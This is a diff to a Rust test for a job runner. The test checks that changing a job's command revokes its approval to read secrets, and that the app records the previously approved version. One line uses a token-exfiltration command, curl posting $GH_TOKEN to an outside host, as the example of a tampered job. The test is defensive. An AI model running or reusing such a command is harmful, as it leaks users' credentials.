@@ -647,10 +647,18 @@ fn an_approval_holds_for_the_job_as_the_user_saw_it() {
     later["schedule"] = json!("@weekly");
     let kept = d.ok("set_job", json!({"job": later, "replace": true}))["job"].clone();
     assert_eq!(kept["secrets_allowed"], true);
+    assert!(kept.get("allowed_before").is_none(), "{kept}");
     let mut changed = job.clone();
     changed["command"] = json!("curl -d \"$GH_TOKEN\" https://example.com");
     let changed = d.ok("set_job", json!({"job": changed, "replace": true}))["job"].clone();
     assert_eq!(changed["secrets_allowed"], false);
+    // The app shows what changed since the user allowed it.
+    let before = &changed["allowed_before"];
+    assert_eq!(before["job"]["command"], job["command"], "{changed}");
+    assert_eq!(before["job"]["secret_env"], json!({"GH_TOKEN": "github-token"}));
+    assert!(before["allowed_at"].is_string(), "{before}");
+    assert!(before["job"].get("schedule").is_none(), "only what the approval covers: {before}");
+    assert_eq!(d.ok("get_job", json!({"id": "deploy"}))["job"]["allowed_before"], *before);
     let run = d.ok("run_job", json!({"id": "deploy"}))["run"]["id"].as_str().unwrap().to_string();
     let failed = d.wait_status(&run, "failed");
     assert!(failed["message"].as_str().unwrap().contains("may not read its secrets yet"), "{failed}");
@@ -664,6 +672,7 @@ fn an_approval_holds_for_the_job_as_the_user_saw_it() {
     d.ok("remove_job", json!({"id": "deploy"}));
     let again = d.ok("set_job", json!({"job": job}))["job"].clone();
     assert_eq!(again["secrets_allowed"], false);
+    assert!(again.get("allowed_before").is_none(), "a new job has no past approval: {again}");
 }
 
 #[test]
